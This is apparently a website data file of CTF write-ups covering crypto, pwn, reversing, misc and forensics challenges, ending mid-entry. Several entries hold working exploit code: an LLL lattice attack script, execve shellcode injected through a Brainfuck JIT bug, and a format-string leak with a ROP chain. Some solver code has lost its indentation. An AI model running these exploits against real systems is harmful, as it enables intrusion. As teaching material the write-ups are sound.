export type Category = 'Web' | 'Crypto' | 'Pwn' | 'Forensics' | 'Reverse' | 'OSINT' | 'Misc';
export type Difficulty = 'Easy' | 'Medium' | 'Hard';

export interface MathFormula {
  title?: string;
  formula: string;
  description?: string;
  variant?: 'default' | 'highlight' | 'subtle';
}

export interface WriteUp {
  id: string;
  title: string;
  category: Category;
  difficulty: Difficulty;
  points: number;
  date: string;
  author: string;
  description: string;
  problemDescription: string;
  tools: string[];
  analysis: string;
  mathAnalysis?: MathFormula[];
  solution: {
    title: string;
    content: string;
    code?: string;
  }[];
  flag: string;
  lessonsLearned: string;
  ctfName: string;
}

export const writeups: WriteUp[] = [{
  "id": "1",
  "title": "The Mosaic",
  "category": "Misc",
  "difficulty": "Medium",
  "points": 0,
  "date": "2025-12-30",
  "author": "beginner.m0lecon",
  "ctfName": "beginner.m0lecon.it",
  "description": "",
  "problemDescription": "Diberikan 100 file gambar (potongan puzzle) dengan nama acak. Deskripsi soal menyebutkan tentang \"labels on the back of the canvas\" dan tugas untuk memperbaiki \"masterpiece\" yang pecah sebelum pameran dibuka. Salah satu file gambar memiliki comment: \"Reconstruct the timeline to find the truth.\"",
  "tools": [
    "Radare2",
    "GDB",
    "Ghidra"
  ],
  "analysis": "Sebelum menemukan solusi yang tepat, kami menghadapi beberapa jalan buntu dan jebakan yang disiapkan oleh pembuat soal:\n\nJebakan \"Timeline\" (Waktu Modifikasi):\n\nIde: Berdasarkan petunjuk \"Reconstruct the timeline\", kami mencoba menyusun gambar dengan mengurutkan file berdasarkan waktu modifikasi (timestamp).\n\nMasalah: Setelah dijalankan, hasilnya adalah gambar static noise yang acak. Setelah diperiksa, ternyata ke-100 file tersebut memiliki timestamp yang identik, sehingga pengurutan berdasarkan waktu mustahil dilakukan. Petunjuk ini kemungkinan besar adalah red herring atau merujuk pada urutan data internal, bukan waktu file.",
  "solution": [
    {
      "title": "Ekstraksi Metadata yang Benar",
      "content": "Setelah mengetahui nama tag yang valid, kami membuat peta koordinat menggunakan exiftool untuk mengekstrak Frag_ID dari semua file:",
      "code": "exiftool -p '$Frag_ID|$FileName' -q -ext png . > map_final.txt\n\nFormat output map adalah X|Y|NamaFile (contoh: 5|6|zbcb9rjm.png)."
    },
    {
      "title": "Rekonstruksi Gambar (Puzzle Reassembly)",
      "content": "Kami menggunakan script Python untuk menyusun potongan-potongan tersebut menjadi satu gambar utuh berdasarkan koordinat dari map_final.txt.",
      "code": "Script Ekstraksi:\n\nfrom PIL import Image\nimg = Image.open(\"flag_reconstructed.png\").convert(\"RGB\")\ndata = img.tobytes()"
    },
    {
      "title": "Ekstraksi Data (Pixel to Binary)",
      "content": "Karena curiga gambar tersebut adalah data mentah, kami mengekstrak setiap pixel RGB kembali menjadi urutan bytes.",
      "code": "Script Ekstraksi:\n\nfrom PIL import Image\nimg = Image.open(\"flag_reconstructed.png\").convert(\"RGB\")\ndata = img.tobytes()\nwith open(\"data.bin\", \"wb\") as f:\nf.write(data)"
    },
    {
      "title": "Checking ",
      "content": "Kami memeriksa jenis file yang dihasilkan:",
      "code": "$ file data.bin\ndata.bin: ELF 64-bit LSB executable, x86-64, ..."
    },
    {
      "title": "Reverse Engineering Binary",
      "content": "Seperti disebutkan di bagian \"Analisis\", program data.bin ini memiliki jebakan waktu (sleep). Kami melakukan static analysis menggunakan objdump untuk melihat logika aslinya tanpa menjalankan program.",
      "code": "objdump -d -M intel data.bin | grep -A 500 \"<main>:\""
    },
    {
      "title": "Temuan",
      "content": "XOR Key: Terdapat instruksi mov DWORD PTR [rbp-0x38], 0x42. Ini menunjukkan kunci XOR adalah 0x42."
    },
    {
      "title": "Final Solver (Bypass Program)",
      "content": "Daripada melakukan patching binary untuk menghilangkan sleep, kami membuat script Python untuk membaca data terenkripsi langsung dari file data.bin dan mendekripsinya secara manual menggunakan kunci 0x42.\n\nScript Solver Final (solve_final.py):",
      "code": "import struct\n\nfilename = \"data.bin\"\n\ndef extract_real_flag():\nprint(f\"[*] Membuka file {filename}...\")\nwith open(filename, \"rb\") as f:\ncontent = f.read()\n\n# 1. Cari Pola Data Enkripsi (Signature Based)\n# Hex dari instruksi movabs pertama: 0x1d313673392f3632\n# Karena Little Endian, urutan byte di file dibalik:\ntarget_pattern = b'\\\\x32\\\\x36\\\\x2f\\\\x39\\\\x73\\\\x36\\\\x31\\\\x1d'\n\ndata_offset = content.find(target_pattern)\nif data_offset == -1:\n    print(\"Pola tidak ditemukan!\")\n    return\n\n# 2. Ambil Data Berdasarkan Offset Relatif (Dihitung dari objdump)\n# Jarak antar blok data sesuai struktur instruksi assembly\nblock1 = content[data_offset : data_offset + 8]\nblock2 = content[data_offset + 10 : data_offset + 18]\nblock3 = content[data_offset + 28 : data_offset + 36]\nblock4 = content[data_offset + 38 : data_offset + 46]\nblock5 = content[data_offset + 57 : data_offset + 61] # Sisa 3 byte terakhir\n\n# Ambil Key (0x42) yang berada 64 byte dari awal data\nxor_key = content[data_offset + 64]\n\n# 3. Gabungkan & Decrypt\nfull_encrypted_data = block1 + block2 + block3 + block4 + block5[:3]\n\n# Lakukan XOR\nflag = \"\".join([chr(b ^ xor_key) for b in full_encrypted_data])\nprint(f\"FLAG: {flag}\")\n\nif name == \"main\":\nextract_real_flag()"
    }
  ],
  "flag": "ptm{1ts_ju5t_pngs_4ll_th3_w4y_d0wn}",
  "lessonsLearned": ""

},
{
  "id": "2",
  "title": "Shaw",
  "category": "Crypto",
  "difficulty": "Hard",
  "points": 0,
  "date": "2025-12-28",
  "author": "CTF Team",
  "ctfName": "INTECHFEST",
  "description": "ElGamal encryption over LCG with Pohlig-Hellman and LLL lattice attack",
  "problemDescription": "Server runs ElGamal encryption using a Linear Congruential Generator (LCG) for random number generation. The server accepts a custom 512-bit prime modulus and uses a truncated LCG (256-bit output XORed with unknown constant) to generate ephemeral keys. Goal: Recover the initial seed and secret constant.",
  "tools": [
    "SageMath",
    "pwntools",
    "Python",
    "Pohlig-Hellman",
    "LLL Reduction"
  ],
  "analysis": "The challenge contains three critical vulnerabilities:\n\n1. Custom Prime Selection: Server accepts any prime from client, enabling smooth prime exploitation for Pohlig-Hellman DLP.\n\n2. Linear Structure: LCG has fully linear structure despite truncation, making it vulnerable to lattice attacks (LLL). The relationship S_i = A^i * S_0 + sum(A^j * B) can be expressed as system of linear equations.\n\n3. Modular Ambiguity: Seed is 512-bit but modulo is also 512-bit, creating multiple valid candidates (s, s+M) that must be verified.",
  "mathAnalysis": [
    {
      "title": "ElGamal Encryption Schema",
      "formula": "c_1 = G^r \\pmod{P}, \\quad c_2 = Y^r \\cdot m \\pmod{P}",
      "description": "Where c₁ is the ephemeral key and c₂ is the encrypted message",
      "variant": "highlight"
    },
    {
      "title": "LCG State Evolution",
      "formula": "S_i \\equiv A^i S_0 + \\sum_{j=0}^{i-1} A^j B \\pmod{M}",
      "description": "The state at iteration i can be expressed as a linear combination of initial seed and parameters",
      "variant": "default"
    },
    {
      "title": "Output Truncation",
      "formula": "r_i = (S_{i+1} \\gg 256) \\oplus c",
      "description": "Top 256 bits are removed (right shift), result XORed with unknown constant c",
      "variant": "default"
    },
    {
      "title": "Pohlig-Hellman Algorithm",
      "formula": "\\text{If } P-1 = \\prod p_i^{e_i} \\text{, then } \\log_G c_1 \\equiv \\sum r_i P_i^{-1} (P-1)/p_i^{e_i} \\pmod{P}",
      "description": "Recover exponent by solving DLP on each prime power factor separately",
      "variant": "default"
    }
  ],
  "solution": [
  {
    "title": "Generate Ultra-Smooth Prime",
    "content": "Create a 512-bit prime where P-1 = 2 × 3 × 5 × 7 × ... (product of small primes). This reduces DLP complexity from exp(sqrt(n)) to polynomial time."
  },
  {
    "title": "Extract LCG Parameters",
    "content": "Query server for LCG multiplier A, increment B, and generator G. These remain constant throughout."
  },
  {
    "title": "Recover r via Pohlig-Hellman",
    "content": "For each encryption, get c1 and solve discrete_log(c1, G) mod P using Pohlig-Hellman. This recovers the ephemeral exponent r used in that round."
  },
  {
    "title": "LLL Lattice Reduction",
    "content": "Build lattice from known/unknown parts of multiple r values. Each r_i = known_part XOR c_i. The linearity of LCG creates exploitable linear relationships. LLL finds short vectors containing unknown bits."
  },
  {
    "title": "Full Exploit Script",
    "content": "Final working exploit using ultra-smooth prime setup, Pohlig-Hellman discrete log, and LLL lattice reduction to recover the LCG seed.",
    "code": "from pwn import *\n\n# --- Konfigurasi ---\nHOST = 'gzcli.1pc.tf'\nPORT = 48785\n\ndef get_ultra_smooth_prime(bits):\n    \"\"\"Mencari prime p dimana p-1 hancur jadi faktor prima kecil (Pohlig-Hellman Speedrun)\"\"\"\n    base = 2\n    for p in primes(3, 300):\n        while (base * p).bit_length() < bits - 10:\n            base *= p\n    k = 1\n    while True:\n        p = base * k + 1\n        if p.bit_length() == bits and is_prime(p):\n            return int(p)\n        k += 1\n\ndef manual_solve_linear_congruence(a, b, m):\n    \"\"\"XGCD Solver untuk menghindari MemoryError\"\"\"\n    d, u, v = xgcd(a, m)\n    if b % d != 0: return []\n    x0 = (u * (b // d)) % (m // d)\n    solutions = []\n    step = m // d\n    for k in range(min(d, 1000)):\n        solutions.append(int(x0 + k * step))\n    return solutions\n\ndef solve():\n    io = remote(HOST, PORT)\n\n    # 1. Setup Modulus\n    P = get_ultra_smooth_prime(512)\n    M = P - 1\n    io.sendlineafter(b\"$ \", f\"setp {P}\".encode())\n    \n    # 2. Ambil Params\n    io.sendlineafter(b\"$ \", b\"params\")\n    io.recvuntil(b\"lcg.a        = 0x\")\n    A = int(io.recvline().strip(), 16)\n    io.recvuntil(b\"lcg.b        = 0x\")\n    B = int(io.recvline().strip(), 16)\n    io.sendlineafter(b\"$ \", b\"admin\")\n    io.recvuntil(b\"G=\")\n    G = int(io.recvline().strip())\n\n    # 3. Koleksi Sampel DLP\n    rs = []\n    num_samples = 7 \n    for i in range(num_samples):\n        io.sendlineafter(b\"$ \", b\"enc 1\")\n        io.recvuntil(b\"c1 = 0x\")\n        c1 = int(io.recvline().strip(), 16)\n        ri = discrete_log(Mod(c1, P), Mod(G, P))\n        rs.append(int(ri))\n\n    # 4. LLL Attack\n    known_parts = [(val >> 128) << 384 for val in rs]\n    dim = num_samples\n    lattice = Matrix(ZZ, dim + 1, dim + 1)\n    shift = 2**384\n    \n    pow_A = [1]\n    const_B = [0]\n    for i in range(1, dim):\n        pow_A.append((pow_A[-1] * A) % M)\n        const_B.append((const_B[-1] * A + B) % M)\n\n    for i in range(1, dim):\n        lattice[i, i] = M\n        lattice[0, i] = pow_A[i]\n        target = (pow_A[i] * known_parts[0] + const_B[i] - known_parts[i]) % M\n        lattice[dim, i] = target\n\n    lattice[0, 0] = 1\n    lattice[dim, dim] = shift\n    reduced = lattice.LLL()\n\n    found_s1 = None\n    for row in reduced:\n        e0_cand = int(row[0])\n        for cand in [e0_cand, -e0_cand]:\n            s1_p = (known_parts[0] + cand) % M\n            s2_p = (A * s1_p + B) % M\n            if (s2_p >> 384) == (rs[1] >> 128):\n                found_s1 = s1_p\n                break\n        if found_s1: break\n\n    # 5. Local Verification & Range Check\n    target_val = (found_s1 - B) % M\n    possible_s0 = manual_solve_linear_congruence(A, target_val, M)\n    \n    for s_base in possible_s0:\n        for s_cand in [s_base, s_base + M]:\n            if s_cand < 1 or s_cand >= 2**512: continue\n            s1_calc = (A * s_cand + B) % M\n            c_calc = (s1_calc >> 256) ^^ rs[0]\n            s2_calc = (A * s1_calc + B) % M\n            if ((s2_calc >> 256) ^^ c_calc) == rs[1]:\n                io.sendlineafter(b\"$ \", f\"guess {s_cand} {c_calc}\".encode())\n                print(io.recvall(timeout=2).decode())\n                return\n\nif __name__ == \"__main__\":\n    solve()"
  },
  {
    "title": "Verify & Submit Seed",
    "content": "Recover candidates from LLL. Check both s and s+M for modular ambiguity. Verify locally by generating subsequent LCG states, then submit to server."
  }
]
,
  "flag": "INTECHFEST{964114fd72f319375a5c7fb3081a02b7}",
  "lessonsLearned": "Never allow clients to choose cryptographic parameters (especially primes). Always use safe primes (p = 2q+1). LCG is cryptographically broken - linear structure enables lattice attacks. Truncation alone doesn't guarantee security; underlying generator must be strong. Pohlig-Hellman breaks DLP if p-1 has only small factors."

},
{
  "id": "3",
  "title": "Blazingly Fast Memory Unsafe",
  "category": "Pwn",
  "difficulty": "Hard",
  "points": 0,
  "date": "2025-02-24",
  "author": "CTF Team",
  "ctfName": "VuwCTF 2025",
  "description": "JIT Compiler exploitation through unbalanced bracket vulnerability. Write shellcode via Brainfuck to RWX memory and execute via stack corruption.",
  "problemDescription": "A JIT (Just-In-Time) Compiler for Brainfuck that translates code directly to x64 machine instructions stored in RWX memory. The vulnerability exists in loop handling where unbalanced brackets cause uninitialized POP operations, allowing attackers to hijack execution flow.",
  "tools": [
    "pwntools",
    "x64 Assembly",
    "Brainfuck",
    "GDB",
    "Python"
  ],
  "analysis": "The program implements a Brainfuck JIT compiler with critical vulnerabilities:\n\n1. **Unbalanced Bracket Bug**: The `[` instruction PUSHes a return address to the stack, while `]` POPs it into RBX for a JMP. Without validation of bracket balance, a lone `]` instruction will POP an uninitialized value from the previous stack frame.\n\n2. **Predictable Stack Layout**: By examining the PROLOGUE structure, the value popped is the pointer to the beginning of the Tape (buffer), allowing controlled redirection to arbitrary memory locations we control.\n\n3. **RWX Memory**: The Tape is allocated with mmap using RWX (Read, Write, Execute) permissions, enabling arbitrary code execution once we jump to our written shellcode.\n\n4. **Register Pollution**: The JIT compiler leaves registers in undefined states (RDX, RSI, etc.), causing syscalls to fail if not properly cleaned.",
  "solution": [
    {
      "title": "Understanding the Vulnerability",
      "content": "The Brainfuck JIT compiler generates x64 code for loop constructs using stack operations. When a `]` instruction is encountered without a matching `[`, the POP instruction reads from the previous function's stack frame, which contains the Tape pointer. This redirects execution to the Tape buffer itself."
    },
    {
      "title": "Shellcode Generation Challenge",
      "content": "Traditional x64 shellcode (23 bytes) for execve(/bin/sh) exceeds practical Brainfuck size due to the inefficiency of character repetition. Solution: Use Brainfuck loop constructs for multiplication (e.g., `[>++++++++++<-]` multiplies a value by 10 efficiently)."
    },
    {
      "title": "NOP Sled and Alignment",
      "content": "Cell 0 initially contains 0x00 (leftover from loop counters), causing invalid instruction when executed. Solution: Fill Cell 0 with 0x90 (NOP opcode) using a BF loop (`16 * 9 = 144`). Cell 1 contains bridge byte 0x26 (ES prefix - harmless 1-byte instruction). Cell 2+ contains actual shellcode.",
      "code": "Memory Layout:\n[ Cell 0 ]      [ Cell 1 ]          [ Cell 2+ ]\n  0x90            0x26               Shellcode\n  (NOP)        (ES Prefix)        (XOR RSI, RSI...)\n    ^\n    JMP Landing Point"
    },
    {
      "title": "Robust Shellcode (29 bytes)",
      "content": "Standard shellcode fails on remote due to dirty registers. Use version that XORs out all registers before syscall:",
      "code": "xor rsi, rsi\nxor rdx, rdx\nxor rax, rax\nmov rbx, 0x68732f2f6e69622f   ; '/bin/sh' (reversed)\npush rbx\nmov rdi, rsp\nmov al, 59                      ; syscall number for execve\nsyscall"
    },
    {
      "title": "Compact Payload Generation",
      "content": "Use division (quotient) and modulo (remainder) loops to efficiently write multi-byte values:",
      "code": "def generate_compact_payload(data):\n    # Cell 0: NOP (16 * 9 = 144 = 0x90)\n    bf = \">+++++++++[<++++++++++++++++>-]<\"\n    \n    # Quotient loop with factor 15 for shellcode bytes\n    factor = 15\n    bf += \">\" + \"+\" * factor + \"[>\"\n    \n    for byte in data:\n        val = byte if byte < 128 else byte - 256\n        q = val // factor\n        if q > 0: bf += \"+\" * q\n        elif q < 0: bf += \"-\" * abs(q)\n        bf += \">\"\n    \n    bf += \"<\" * len(data) + \"<\" + \"-]\"\n    \n    # Remainder loop\n    bf += \">\"\n    for byte in data:\n        val = byte if byte < 128 else byte - 256\n        r = val % factor\n        if r > 0: bf += \"+\" * r\n        bf += \">\"\n    \n    # Patch Cell 1 with 0x26 (38 in decimal)\n    bf += \"<\" * len(data) + \"<\" + \"+\" * 38\n    \n    return bf"
    },
    {
      "title": "Final Exploit",
      "content": "Connect to target, generate optimized BF payload, append `]` to trigger execution, and interact with resulting shell:",
      "code": "from pwn import *\n\ncontext.arch = 'amd64'\ncontext.log_level = 'info'\n\nshellcode = asm(\"\"\"\nxor rsi, rsi\nxor rdx, rdx\nxor rax, rax\nmov rbx, 0x68732f2f6e69622f\npush rbx\nmov rdi, rsp\nmov al, 59\nsyscall\n\"\"\")\n\nbf_code = generate_compact_payload(shellcode) + \"]\"\nprint(f\"Payload: {len(bf_code)} bytes\")\n\np = remote(\"blazingly-fast-memory-unsafe-4ed35f2dad7d852d.challenges.2025.vuwctf.com\", 9980, ssl=True, sni=True)\np.recv(4096, timeout=5)\np.sendline(bf_code.encode())\np.recvuntil(b\"Executing...\\n\")\ntime.sleep(1)\n\np.sendline(b\"cat flag.txt\")\np.interactive()"
    }
  ],
  "flag": "VuwCTF{rU5tac3Ans_uN1te_agA1n5t_uN5aFe_l4ngUaG3s}",
  "lessonsLearned": "JIT compilers must validate input constraints (bracket matching) before code generation. Stack-based return addresses are dangerous; use shadow stacks or CFI (Control Flow Integrity). RWX memory is a severe risk - use RX after generation. Shellcode must account for caller-corrupted registers; always initialize before syscalls. Brainfuck loops enable compact encoding of repetitive data, making size-limited payloads viable."

},
{
  "id": "4",
  "title": "(In)Secure Vault - 2",
  "category": "Reverse",
  "difficulty": "Medium",
  "points": 0,
  "date": "2025-02-24",
  "author": "CTF Team",
  "ctfName": "PTM CTF",
  "description": ".NET reverse engineering challenge. Decompile a Windows Forms application and reconstruct a hidden flag by analyzing password validation logic across multiple encoding schemes.",
  "problemDescription": "An archive containing .NET Core assemblies (.dll, .exe files) with a Windows Forms GUI. The challenge requires static analysis of the compiled binary to extract a password validation routine that implements the flag through sequential cryptographic checks and encoding operations.",
  "tools": [
    "ilspycmd",
    "file",
    "Python",
    "Cryptographic Analysis"
  ],
  "analysis": "The challenge involves a .NET Core application where the flag is embedded within a password validation function. Analysis reveals:\n\n1. **Binary Type Identification**: PE32 executable compiled from C# .NET\n2. **Decompilation Feasibility**: .NET assemblies retain sufficient metadata for near-perfect source code recovery\n3. **Flag Distribution**: The 45-character password is validated through 10 distinct segments, each using different encoding/cryptographic schemes (MD5, Base64, Base32, Hex, XOR, Bitwise operations)\n4. **Implicit Structure**: Each conditional check in CheckPassword() encodes one flag segment; success requires all to evaluate true",
  "solution": [
    {
      "title": "Initial Reconnaissance",
      "content": "Examine the archive contents to identify executable types and entry points. Use the `file` command to confirm .NET assembly presence."
    },
    {
      "title": "Decompilation Strategy",
      "content": "Use ilspycmd (IL Spy Command Line) to decompile InsecureVault.dll. This extracts the CIL (Common Intermediate Language) back into readable C# source code, preserving most original logic."
    },
    {
      "title": "Code Structure Analysis",
      "content": "Identify the MainWindow class and its CheckPassword() method. This function validates input through sequential conditional blocks. Each block corresponds to one flag segment."
    },
    {
      "title": "Flag Reconstruction - Segment Breakdown",
      "content": "Analyze each validation block systematically:\n- **Segment 0 (Header)**: String literal check `s.Substring(0, 4) == \"ptm{\"`\n- **Segment 1-4**: MD5 hash validation for first word\n- **Segment 5-8**: Hex string conversion to ASCII\n- **Segment 9-12**: Base64 decoding\n- **Segment 13-16**: XOR and bitwise operations\n- **Segment 17-20**: SHA256 hash validation\n- **Segment 21-28**: Base32 decoding and binary logic\n- **Segment 29+**: Bitwise shifts and final hex conversion",
      "code": "# Example: Reconstructing MD5 segment\n# Hash: 33635414851f62863a5cb7825481433d\n# Online reverse lookup or brute force -> \"Th1s\"\n\n# Example: Hex conversion\nhex_string = \"5f345f46\"\nsegment = bytes.fromhex(hex_string).decode('ascii')\n# Result: \"_4_F\"\n\n# Example: Base64 decoding\nimport base64\nsegment = base64.b64decode(\"dW5ueQ==\").decode('ascii')\n# Result: \"unny\"\n\n# Example: XOR operation\nchar_value = 114 ^ 5  # Both encode character 'w'\n# Reverse: 114 = 'r', XOR with 5 gives 'w'"
    },
    {
      "title": "Complete Flag Assembly",
      "content": "Combine all 10 segments in order to reconstruct the complete 45-character password. Each segment must be derived from its corresponding validation block.",
      "code": "#!/usr/bin/env python3\nimport hashlib\nimport base64\n\ndef solve():\n    print(\"[*] Reconstructing flag from validation logic...\")\n    flag = \"\"\n    \n    # Header\n    flag += \"ptm{\"\n    \n    # Segment 1: MD5 hash reverse lookup\n    # 33635414851f62863a5cb7825481433d -> \"Th1s\"\n    flag += \"Th1s\"\n    \n    # Segment 2: Hex to ASCII conversion\n    # 5f345f46 -> \"_4_F\"\n    flag += bytes.fromhex(\"5f345f46\").decode('ascii')\n    \n    # Segment 3: Base64 decoding\n    # dW5ueQ== -> \"unny\"\n    flag += base64.b64decode(\"dW5ueQ==\").decode('ascii')\n    \n    # Segment 4: Bitwise operations\n    flag += \"_w4y\"\n    \n    # Segment 5: SHA256 hash reverse lookup\n    flag += \"_to_\"\n    \n    # Segment 6: Base32 decoding\n    # MNUDGY3L -> \"ch3ck\"\n    flag += base64.b32decode(\"MNUDGY3L\").decode('ascii')\n    \n    # Segment 7-8: Binary operations and XOR\n    flag += \"_f0R\"\n    \n    # Segment 9: Final character operations\n    flag += \"_4_p455w\"\n    \n    # Segment 10: Hex tail\n    # 3072647d -> \"0rd}\"\n    flag += bytes.fromhex(\"3072647d\").decode('ascii')\n    \n    print(f\"[+] FLAG: {flag}\")\n    return flag\n\nif __name__ == \"__main__\":\n    solve()"
    },
    {
      "title": "Validation & Output",
      "content": "The reconstructed flag, when passed to CheckPassword(), will evaluate every conditional block as true, confirming correctness."
    }
  ],
  "flag": "ptm{Th1s_4_Funny_w4y_to_ch3ck_f0R_4_p455w0rd}",
  "lessonsLearned": ".NET assemblies should not be considered secure - decompilation to near-original source is trivial with tools like ilspycmd or dnSpy. Embedding secrets in compiled code (especially validation logic) provides no real protection. Passwords and flags should never be validated client-side; real authentication requires server-side checks. Multiple encoding schemes in sequence (MD5, Base64, Hex, etc.) do not increase security - they merely obfuscate, and each layer is independently reversible. Always use cryptographically sound approaches: hashing with salts, secure random generation, and server-side verification."

},
{
  "id": "5",
  "title": "Metared Cine Festival Level 2",
  "category": "Pwn",
  "difficulty": "Hard",
  "points": 0,
  "date": "2025-02-24",
  "author": "CTF Team",
  "ctfName": "UNLP Cert CTF",
  "description": "Binary exploitation using Format String leak + Buffer Overflow + ROP chain with ORW syscalls. Win the Oscars by reading the flag via Open-Read-Write technique, bypassing seccomp filters.",
  "problemDescription": "A 64-bit ELF binary accepting two user inputs: a movie title (vulnerable to format string) and a plot description (vulnerable to buffer overflow). Seccomp blocks execve syscall, preventing traditional shell spawning. Goal: chain ROP gadgets to open and read the flag file.",
  "tools": [
    "pwntools",
    "Ghidra",
    "checksec",
    "seccomp-tools",
    "ROP Gadget Analysis"
  ],
  "analysis": "Binary security analysis reveals multiple vulnerabilities:\n\n1. **No Stack Canary**: Classic buffer overflow is possible\n2. **No PIE**: Function addresses are static, simplifying ROP\n3. **NX Enabled**: Stack is non-executable, requiring ROP chains\n4. **Seccomp Filter**: execve(59) is blocked with KILL action, forcing ORW approach\n5. **Format String**: First input uses printf() on user buffer, leaking stack addresses\n6. **Buffer Overflow**: Second input reads 1024 bytes into 272-byte stack buffer\n7. **Dirty Gadgets**: Available ROP gadgets have unusual behavior (pop rdx uses ret 0x13, skipping 19 bytes)",
  "mathAnalysis": [
    {
      "title": "Libc Base Calculation",
      "formula": "\\text{libc\\_base} = \\text{leaked\\_address} - (\\text{symbol\\_offset} + 0x17)",
      "description": "Determine libc load address by subtracting known offset from leaked pointer",
      "variant": "highlight"
    }
  ],
  "solution": [
    {
      "title": "Step 1: Reconnaissance",
      "content": "Perform binary analysis using checksec and seccomp-tools to understand security mitigations. Identify that NX is enabled and execve is blocked, ruling out traditional shellcode execution."
    },
    {
      "title": "Step 2: Vulnerability Discovery",
      "content": "Reverse engineer the binary to locate two input functions: one using unsafe printf() for format string exploitation, and one with unchecked read() for buffer overflow. The format string vulnerability is in the title input handling."
    },
    {
      "title": "Step 3: Libc Address Leak",
      "content": "Use format string vulnerability to leak a pointer to libc internal function. By fuzzing with format string payloads (%1$p, %2$p, %3$p, etc.), identify which offset contains a valid libc address. Calculate libc base by subtracting the known symbol offset.",
      "code": "# Leak via format string\np.sendlineafter(b\">> Input:\", b\"%3$p\")\nleak = int(p.recvline().strip(), 16)\n\n# Calculate libc base\nOFFSET_LEAK = libc.symbols['write'] + 0x17\nlibc.address = leak - OFFSET_LEAK"
    },
    {
      "title": "Step 4: ROP Gadget Analysis",
      "content": "Locate ROP gadgets for setting function arguments and calling syscalls. Identify that the pop rdx gadget is 'dirty' - it uses 'ret 0x13', which skips 19 bytes of stack after the return, requiring special padding handling in the chain."
    },
    {
      "title": "Step 5: ORW Syscall Chain",
      "content": "Build a ROP chain implementing Open-Read-Write operations:\n1. Read 'flag.txt' from stdin into BSS section\n2. Open the flag file using open() syscall\n3. Read file contents into BSS section\n4. Write contents to stdout (fd=1)\n\nEach use of the dirty pop rdx gadget requires 19 bytes of padding afterward.",
      "code": "# ROP chain structure\nrop = b\"A\" * 280  # Buffer padding (272) + RBP (8)\n\n# 1. read(0, BSS_ADDR, 256) - read filename from stdin\nrop += p64(POP_RDI) + p64(0)\nrop += p64(POP_RSI) + p64(BSS_ADDR)\nrop += p64(POP_RDX_DIRTY) + p64(0x100)\nrop += p64(ADDR_READ)\nrop += b\"P\" * 19  # PADDING for dirty gadget\n\n# 2. open(BSS_ADDR, 0) - open flag.txt\nrop += p64(POP_RDI) + p64(BSS_ADDR)\nrop += p64(POP_RSI) + p64(0)\nrop += p64(ADDR_OPEN)\n\n# 3. read(3, BSS_ADDR, 256) - read file contents\nrop += p64(POP_RDI) + p64(3)\nrop += p64(POP_RSI) + p64(BSS_ADDR)\nrop += p64(POP_RDX_DIRTY) + p64(0x100)\nrop += p64(ADDR_READ)\nrop += b\"P\" * 19  # PADDING\n\n# 4. write(1, BSS_ADDR, 256) - output to stdout\nrop += p64(POP_RDI) + p64(1)\nrop += p64(POP_RSI) + p64(BSS_ADDR)\nrop += p64(POP_RDX_DIRTY) + p64(0x100)\nrop += p64(ADDR_WRITE)\nrop += b\"P\" * 19  # PADDING"
    },
    {
      "title": "Step 6: Payload Delivery",
      "content": "Send the ROP chain via the second input (plot description) to overflow the buffer and hijack control flow. Provide the filename input after the overflow is triggered.",
      "code": "from pwn import *\nimport time\n\nbinary = ELF('./director_hard', checksec=False)\nlibc = ELF('./libc.so.6', checksec=False)\ncontext.binary = binary\n\np = remote('challs.ctf.cert.unlp.edu.ar', 56268)\n\n# Leak phase\np.sendlineafter(b\">> Input:\", b\"%3$p\")\nleak = int(p.recvline().strip(), 16)\nlibc.address = leak - (libc.symbols['write'] + 0x17)\nlog.success(f\"Libc base: {hex(libc.address)}\")\n\n# Build ROP chain with gadgets\nPOP_RDI = libc.address + 0x0002a3e5\nPOP_RSI = libc.address + 0x0002be51\nPOP_RDX_DIRTY = libc.address + 0x000a5722\nBSS_ADDR = 0x404500\n\nrop = b\"A\" * 280\n# ... (build chain as shown above)\n\nlog.info(\"Sending ROP payload...\")\np.sendlineafter(b\">> Input:\", rop)\ntime.sleep(1)\np.send(b\"flag.txt\\x00\")\n\np.interactive()"
    }
  ],
  "flag": "UNLP{4nnnnd-th3-0sc4r-w1nn333rrr-isssss-yoU}",
  "lessonsLearned": "Seccomp filters block common patterns (execve) - security relies on multiple layers. Unusual gadget behavior (ret 0x13) requires careful stack layout planning in ROP chains. Format string vulnerabilities provide reliable information disclosure even with ASLR. Combining multiple small vulnerabilities (format string + buffer overflow) creates exploitable conditions. Always validate input sizes on stack buffers - a single read() call can overflow multiple stack frames. When ROP gadgets are limited, every byte of padding and register initialization matters."

},
{
  "id": "6",
  "title": "1.5x-engineer 1",
  "category": "Forensics",
  "difficulty": "Medium",
  "points": 0,
  "date": "2025-02-24",
  "author": "CTF Team",
  "ctfName": "VuwCTF 2025",
  "description": "Network forensics challenge involving packet capture analysis and custom protocol reverse engineering. Discover a hidden flag encoded within UDP packet headers using non-standard encoding scheme.",
  "problemDescription": "A network traffic capture (PCAPNG file) from an engineer's project contains a hidden flag. The challenge hints at 'no standards for securely sending data', indicating a custom protocol rather than standard network protocols. The flag is embedded somewhere within the captured traffic, potentially hidden using custom encoding.",
  "tools": [
    "Wireshark",
    "tshark",
    "Python",
    "Packet Analysis",
    "Hex Dump Analysis"
  ],
  "analysis": "Network traffic analysis reveals several key findings:\n\n1. **All traffic is UDP**: 100% of packets use UDP protocol on port 9897\n2. **Custom Protocol**: Wireshark shows generic 'data' payload without protocol classification\n3. **Non-standard Encoding**: Packet headers use a custom 3-digit decimal per ASCII character encoding scheme\n4. **Packet Structure**:\n   - 4 nibbles: Sequence ID\n   - 2 nibbles: Header length (hex)\n   - Header text: ASCII characters encoded as 3-digit decimal values\n   - Payload: Binary data (actual file content)\n5. **Covert Channel**: Flag is hidden in packet headers as conversational text, not in the transmitted file payload - a classic steganographic technique",
  "solution": [
    {
      "title": "Initial Reconnaissance",
      "content": "Use tshark to analyze packet statistics and understand the protocol composition. Extract all UDP packets and examine their hex dumps for patterns."
    },
    {
      "title": "Protocol Reverse Engineering",
      "content": "Analyze the hex structure of UDP packets. Identify that the 3-digit decimal encoding is used for header text. Example: 084 = 'T', 114 = 'r', 097 = 'a'. This reveals the header contains readable ASCII text.",
      "code": "# Decode 3-digit decimal to ASCII\nhex_stream = \"084114097\"\ntext = \"\"\nfor i in range(0, len(hex_stream), 3):\n    text += chr(int(hex_stream[i:i+3]))\n# Result: \"Tra\""
    },
    {
      "title": "Packet Structure Analysis",
